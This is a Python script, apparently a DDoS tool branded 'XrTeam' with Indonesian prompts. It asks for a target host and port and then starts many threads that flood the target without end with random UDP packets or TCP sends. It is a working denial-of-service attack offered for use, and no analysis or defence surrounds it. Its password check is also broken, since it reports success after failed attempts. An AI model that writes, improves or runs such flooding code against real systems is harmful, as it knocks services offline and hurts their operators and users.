#!/usr/bin/env python3
#Xr
import random
import socket
import threading
import os
import time

os.system("clear")
password ="XrTeam"

for i in range(3):
	pwd = input("\033[93m> Masukan Password : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("\033[92mTunggu 5 detik")
		break
	else:
		time.sleep(5)
		print("\033[91m> Password Salah")
		continue
time.sleep(5)
print("\033[94m> Password Benar")

os.system("clear")
print                    ("\033[92m")
print("""╔═╗╔═╗╔═══╗╔════╗╔═══╗╔═══╗╔═╗╔═╗
╚╗╚╝╔╝║╔═╗║║╔╗╔╗║║╔══╝║╔═╗║║║╚╝║║
─╚╗╔╝─║╚═╝║╚╝║║╚╝║╚══╗║║─║║║╔╗╔╗║
─╔╝╚╗─║╔╗╔╝──║║──║╔══╝║╚═╝║║║║║║║
╔╝╔╗╚╗║║║╚╗──║║──║╚══╗║╔═╗║║║║║║║
╚═╝╚═╝╚╝╚═╝──╚╝──╚═══╝╚╝─╚╝╚╝╚╝╚╝""")

ip = str(input(" [ENTER]Host/Ip:"))
port = int(input(" [ENTER]Port:"))
choice = str(input(" [ENTER]YAKEN DDOS?(y/n):"))
times = int(input(" [ENTER]Packets:"))
threads = int(input(" [ENTER]Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XrTeam Attack From Server!!!")
		except:
			print("[!] Down!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XrTeam Attack From Server!!!")
		except:
			s.close()
			print("[*] Down!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()